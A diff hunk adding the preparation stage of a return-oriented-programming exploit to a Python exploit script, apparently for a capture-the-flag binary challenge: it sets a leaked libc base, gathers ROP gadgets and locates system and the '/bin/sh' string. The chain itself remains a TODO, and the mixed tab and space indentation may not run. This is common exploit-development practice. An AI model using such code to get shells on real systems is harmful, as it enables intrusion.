@@ -59,6 +59,23 @@ def exploit(*args, **kwargs):
     # TODO: exploit chain
 
 
+	# After leaking libc_base
+	libc.address = libc_base
+
+	ggs 	= ROPGadgets(libc)
+	p_rdi_r = ggs['p_rdi_r']
+	p_rsi_r = ggs['p_rsi_r']
+	p_rax_r = ggs['p_rax_r']
+	p_rsp_r = ggs['p_rsp_r']
+	p_rdx_rbx_r = ggs['p_rdx_rbx_r']
+	leave_r = ggs['leave_r']
+	ret 	= ggs['ret']
+
+	ggs.dump()
+
+	system = libc.sym.system
+	binsh  = next(libc.search(b'/bin/sh\x00'))
+
     io.interactive()
 
 # PIPELINE
